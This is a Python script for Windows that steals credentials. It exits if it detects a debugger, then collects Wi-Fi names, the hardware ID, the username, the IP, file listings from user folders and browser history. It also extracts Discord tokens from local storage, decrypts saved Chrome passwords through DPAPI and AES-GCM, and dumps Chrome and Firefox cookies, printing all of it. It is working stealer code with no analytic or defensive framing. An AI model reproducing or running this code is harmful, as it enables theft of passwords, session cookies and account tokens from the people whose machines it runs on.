import ctypes
if ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), False) != 0:
	exit(0)
if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
	exit(0)
import psutil
import platform
import requests
import os
import glob
import re
import time
import browser_cookie3
import getpass
import browserhistory as bh
import json
import base64
import sqlite3
import win32crypt
import psutil
import platform
import shutil
import io
import random
import yaml
import subprocess
from io import BytesIO
from os import remove
from sys import argv
from datetime import datetime
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta
from uuid import getnode as get_mac
try:
	r = subprocess.run(["netsh", "wlan", "show", "network"], capture_output=True, text=True).stdout
	ls = r.split("\n")
	ssids = [k for k in ls if 'SSID' in k]
	print(f"\n=======SSID=======")
	print(ssids)
except:
	print(f"\n=======NO SSID=======")
try:
	timecurrent = datetime.now()
except:
	timecurrent = 'Unavailable'
try:
	hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
except:
	hwid = 'Unavailable'
try:
	user = getpass.getuser()
except:
	user = 'Unavailable'
ip='None / Error'
try:ip=requests.get('http://checkip.amazonaws.com/').text
except:ip='None / Error'
print(f'\nUSERNAME > {user}')
print(f'HWID > {hwid}')
print(f'CURRENT TIME > {timecurrent}')
print(f'IP ADRESS > {ip}')
def fileNAME(filepath='',printstring='C:'):
	try:
		path = r"C:\%s" % (filepath)
		directories = os.listdir( path )
	except:
		print(f"\n=======[FOLDER {printstring} DOESN'T EXIST]=======")
		return
	print(f'\n=======FILES {printstring}======')
	filenumber = 0
	for file in directories:
	   print(f'[{filenumber}] ' + file)
	   filenumber = filenumber+1
fileNAME()
fileNAME(f'Program Files','PROGRAM FILES')
fileNAME(f'Program Files (x86)','PROGRAM FILES x86')
fileNAME(f'Users\{user}\Desktop','DESKTOP')
fileNAME(f'Users\{user}\Videos','VIDEOS')
fileNAME(f'Users\{user}\Documents','DOCUMENTS')
fileNAME(f'Users\{user}\Downloads','DOWNLOADS')
fileNAME(f'Users\{user}\Music','MUSIC')
fileNAME(f'Users\{user}\Pictures','PICS')
fileNAME(f'Users','USERS')
try:
	dict_obj = bh.get_browserhistory()
	print(f'\n=======BROWSER HISTORY======')
	print(yaml.dump(dict_obj).replace('- !!python/tuple', ''))
except:
	print('\n=======NO BROWSER HISTORY FOUND======')
	pass
try:
	def getTokens():
		tokns = []
		appdatapath = os.getenv('APPDATA')
		files = glob.glob(appdatapath + r"\Discord\Local Storage\leveldb\*.ldb")
		files.extend(glob.glob(appdatapath + r"\Discord\Local Storage\leveldb\*.log"))
		for file in files:
			with open( file, 'r',encoding='ISO-8859-1') as content_file:
				try:
					content = content_file.read()
					possible = [x.group() for x in re.finditer(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)]
					if len(possible) > 0:
						tokns.extend(possible)
				except:
					pass
		return tokns
	def SendTokens(tkns):
		content = ''
		for tkn in tkns:
			content += tkn + "\n"
		print(f'\n=======TOKENS======\n',content)
	tkns = getTokens()
	SendTokens(tkns)
	def get_size(bytes, suffix="B"):
		factor = 1024
		for unit in ["", "K", "M", "G", "T", "P"]:
			if bytes < factor:
				return f"{bytes:.2f}{unit}{suffix}"
			bytes /= factor
except:
	pass
try:
	print("="*40, "System Information", "="*40)
	uname = platform.uname()
	print(f"System: {uname.system}")
	print(f"Node Name: {uname.node}")
	print(f"Release: {uname.release}")
	print(f"Version: {uname.version}")
	print(f"Machine: {uname.machine}")
	print(f"Processor: {uname.processor}")
	print("="*40, "Boot Time", "="*40)
	boot_time_timestamp = psutil.boot_time()
	bt = datetime.fromtimestamp(boot_time_timestamp)
	print(f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}")
	print("="*40, "CPU Info", "="*40)
	print("Physical cores:", psutil.cpu_count(logical=False))
	print("Total cores:", psutil.cpu_count(logical=True))
	cpufreq = psutil.cpu_freq()
	print(f"Max Frequency: {cpufreq.max:.2f}Mhz")
	print(f"Min Frequency: {cpufreq.min:.2f}Mhz")
	print(f"Current Frequency: {cpufreq.current:.2f}Mhz")
	print("CPU Usage Per Core:")
	for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
		print(f"Core {i}: {percentage}%")
	print(f"Total CPU Usage: {psutil.cpu_percent()}%")
	print("="*40, "Memory Information", "="*40)
	svmem = psutil.virtual_memory()
	print(f"Total: {get_size(svmem.total)}")
	print(f"Available: {get_size(svmem.available)}")
	print(f"Used: {get_size(svmem.used)}")
	print(f"Percentage: {svmem.percent}%")
	print("="*20, "SWAP", "="*20)
	swap = psutil.swap_memory()
	print(f"Total: {get_size(swap.total)}")
	print(f"Free: {get_size(swap.free)}")
	print(f"Used: {get_size(swap.used)}")
	print(f"Percentage: {swap.percent}%")
except:
	pass
try:
	print("="*40, "Disk Information", "="*40)
	print("Partitions and Usage:")
	partitions = psutil.disk_partitions()
	for partition in partitions:
		print(f"=== Device: {partition.device} ===")
		print(f"  Mountpoint: {partition.mountpoint}")
		print(f"  File system type: {partition.fstype}")
		try:
			partition_usage = psutil.disk_usage(partition.mountpoint)
		except PermissionError:
			continue
		print(f"  Total Size: {get_size(partition_usage.total)}")
		print(f"  Used: {get_size(partition_usage.used)}")
		print(f"  Free: {get_size(partition_usage.free)}")
		print(f"  Percentage: {partition_usage.percent}%")
	disk_io = psutil.disk_io_counters()
	print(f"Total read: {get_size(disk_io.read_bytes)}")
	print(f"Total write: {get_size(disk_io.write_bytes)}")
	print("="*40, "Network Information", "="*40)
	if_addrs = psutil.net_if_addrs()
	for interface_name, interface_addresses in if_addrs.items():
		for address in interface_addresses:
			print(f"=== Interface: {interface_name} ===")
			if str(address.family) == 'AddressFamily.AF_INET':
				print(f"  IP Address: {address.address}")
				print(f"  Netmask: {address.netmask}")
				print(f"  Broadcast IP: {address.broadcast}")
			elif str(address.family) == 'AddressFamily.AF_PACKET':
				print(f"  MAC Address: {address.address}")
				print(f"  Netmask: {address.netmask}")
				print(f"  Broadcast MAC: {address.broadcast}")
	net_io = psutil.net_io_counters()
	print(f"Total Bytes Sent: {get_size(net_io.bytes_sent)}")
	print(f"Total Bytes Received: {get_size(net_io.bytes_recv)}")
except:
	pass
try:
	def get_chrome_datetime(chromedate):
		return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

	def get_encryption_key():
		local_state_path = os.path.join(os.environ["USERPROFILE"],
										"AppData", "Local", "Google", "Chrome",
										"User Data", "Local State")
		with open(local_state_path, "r", encoding="utf-8") as f:
			local_state = f.read()
			local_state = json.loads(local_state)
		key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
		key = key[5:]
		return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
	def decrypt_password(password, key):
		try:
			iv = password[3:15]
			password = password[15:]
			cipher = AES.new(key, AES.MODE_GCM, iv)
			return cipher.decrypt(password)[:-16].decode()
		except:
			try:
				return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
			except:
				return ""
	def main():
		# get the AES key
		key = get_encryption_key()
		db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
								"Google", "Chrome", "User Data", "default", "Login Data")
		filename = "retro.dll"
		shutil.copyfile(db_path, filename)
		db = sqlite3.connect(filename)
		cursor = db.cursor()
		cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
		for row in cursor.fetchall():
			origin_url = row[0]
			action_url = row[1]
			username = row[2]
			password = decrypt_password(row[3], key)
			date_created = row[4]
			date_last_used = row[5]
			if username or password:
				print(f"Origin URL: {origin_url}")
				print(f"Action URL: {action_url}")
				print(f"Username: {username}")
				print(f"Password: {password}")
			else:
				continue
			if date_created != 86400000000 and date_created:
				print(f"Creation date: {str(get_chrome_datetime(date_created))}")
			if date_last_used != 86400000000 and date_last_used:
				print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
			print("="*50)
		cursor.close()
		db.close()
		try:
			os.remove(filename)
		except:
			pass
	main()
except:
	pass
try:
	cokinumber = 0
	cookies=list(browser_cookie3.chrome())+list(browser_cookie3.firefox())
	print('\n=======COOKIES======')
	for item in cookies:
			item=str(item).replace('<', '').replace('>', '')
			print(f'[{cokinumber}] {item}')
			cokinumber=cokinumber+1
except:
	print('\n=======NO COOKIES======')
